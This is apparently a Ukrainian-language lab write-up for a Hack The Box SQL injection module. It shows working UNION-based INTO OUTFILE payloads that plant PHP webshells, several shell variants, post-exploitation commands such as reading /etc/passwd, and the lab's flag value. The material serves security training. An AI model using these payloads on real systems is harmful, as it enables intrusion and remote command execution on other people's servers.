# SQL Injection — Writing Files & Webshell (INTO OUTFILE)

## Модуль
[SQL Injection Fundamentals — Writing Files](https://academy.hackthebox.com/app/module/33/section/793)

## Концепція

MySQL дозволяє записувати файли через `INTO OUTFILE` якщо:
- `secure_file_priv` порожній (запис дозволено будь-куди)
- Юзер має привілей `FILE`
- Веб-сервер має права запису в директорію

## Виконані кроки

### Крок 1 — Перевірити secure_file_priv
?port_code=cn' UNION select 1,variable_name,variable_value,4
FROM information_schema.global_variables
WHERE variable_name='secure_file_priv'-- -

→ SECURE_FILE_PRIV = (порожньо) = запис дозволено будь-куди ✓

### Крок 2 — Записати PHP webshell
?port_code=cn' UNION select 1,'<?php system($_REQUEST); ?>',3,4
INTO OUTFILE '/var/www/html/shell.php'-- -

### Крок 3 — Верифікація webshell
http://TARGET/shell.php?0=id
→ uid=33(www-data) gid=33(www-data) groups=33(www-data)

### Крок 4 — Пошук флагу
http://TARGET/shell.php?0=find / -name ".txt" -not -path "/proc/*" 2>/dev/null
→ /var/www/flag.txt

### Крок 5 — Читання флагу
http://TARGET/shell.php?0=cat /var/www/flag.txt

**Flag:** `d2b5b27ae688b6a0f1d21b7d3a0798cd`

---

## Умови для INTO OUTFILE

| Умова | Перевірка |
|-------|-----------|
| `secure_file_priv` порожній | `SELECT variable_value FROM information_schema.global_variables WHERE variable_name='secure_file_priv'` |
| FILE привілей є | `LOAD_FILE('/etc/passwd')` повертає дані |
| Директорія writable | Зазвичай `/var/www/html/` для www-data |

## Webshell payload варіанти

```sql
-- Мінімальний
' UNION select 1,'<?php system($_REQUEST); ?>',3,4
INTO OUTFILE '/var/www/html/shell.php'-- -

-- Через $_GET
' UNION select 1,'<?php system($_GET["cmd"]); ?>',3,4
INTO OUTFILE '/var/www/html/cmd.php'-- -

-- Через exec (якщо system заблокований)
' UNION select 1,'<?php echo shell_exec($_GET["cmd"]); ?>',3,4
INTO OUTFILE '/var/www/html/exec.php'-- -
```

## Корисні команди через webshell

```bash
# Ідентифікація
?0=id
?0=whoami

# Пошук флагів
?0=find / -name "flag*" -not -path "*/proc/*" 2>/dev/null
?0=find / -name "*.txt" -not -path "*/proc/*" 2>/dev/null

# Читання файлів
?0=cat /var/www/flag.txt
?0=cat /etc/passwd

# Мережева розвідка
?0=ip a
?0=netstat -tlnp 2>/dev/null
```

## Важливо

> `secure_file_priv`:
> - Порожньо `""` → запис будь-куди ✓
> - `/var/lib/mysql/` → запис тільки туди ✗
> - `NULL` → запис заборонено повністю ✗
